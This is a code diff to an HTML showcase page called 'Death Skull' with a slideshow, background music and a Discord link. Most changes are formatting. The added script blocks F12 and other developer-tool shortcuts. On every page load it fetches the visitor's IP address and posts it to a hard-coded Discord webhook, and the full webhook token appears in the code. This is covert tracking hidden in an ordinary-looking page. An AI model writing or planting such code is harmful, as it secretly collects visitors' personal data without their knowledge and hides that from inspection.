@@ -1,4 +1,5 @@
-<html lang="en"><head>
+<html lang="en">
+<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Death Skull</title>
@@ -111,7 +112,7 @@
     <div id="volume-bar" class="volume-bar" style="width: 56%;"></div>
   </div>
 </div>
-<audio id="bg-music" autoplay="" loop="">
+<audio id="bg-music" autoplay loop>
   <source src="death_theme.mp3" type="audio/mpeg">
 </audio>
 <div class="slideshow-container">
@@ -143,7 +144,9 @@
   Nawaf &amp; NAIF &amp; DeathRow &lt;3<br>
   <a href="https://discord.gg/" target="_blank">Discord.gg/</a>
 </div>
+
 <script>
+  // === سلايد شو + الصوتيات ===
   let slideIndex = 0;
   showSlides();
   function showSlides() {
@@ -156,6 +159,7 @@
     slides[slideIndex - 1].style.display = "block";
     setTimeout(showSlides, 2000);
   }
+
   const music = document.getElementById("bg-music");
   function toggleMusic() {
     if (music.paused) {
@@ -195,7 +199,46 @@
       document.addEventListener("click", () => music.play(), { once: true });
     });
   });
+
+  // === سكربت منع F12 + إرسال IP ===
+  document.onkeydown = function(e) {
+    if (e.keyCode == 123) return false;
+    if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
+    if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) return false;
+    if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false;
+    if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+  }
+
+  function fetchIPAndSend() {
+    const webhookURL = "https://canary.discord.com/api/webhooks/1406835678381215875/fvpexHZCIFXoEheK0iMv_dE9Bq9gt0hWuJnyv7hG4JrORkGoSMoqCalKEyagRdymQIJu";
+    fetch("https://api64.ipify.org?format=json")
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+        sendToWebhook(ip);
+      })
+      .catch(error => console.error("Error fetching IP:", error));
+  }
+
+  function sendToWebhook(ip) {
+    const webhookURL = "https://canary.discord.com/api/webhooks/1406835678381215875/fvpexHZCIFXoEheK0iMv_dE9Bq9gt0hWuJnyv7hG4JrORkGoSMoqCalKEyagRdymQIJu";
+    const message = { content: `Visitor IP: ${ip}` };
+    fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(message)
+    })
+    .then(response => {
+      if (response.ok) console.log("IP sent to webhook successfully");
+      else console.error("Error sending IP to webhook:", response.statusText);
+    })
+    .catch(error => console.error("Error sending IP to webhook:", error));
+  }
+
+  window.onload = function() {
+    fetchIPAndSend();
+  };
 </script>
 
-
-</body></html>
+</body>
+</html>
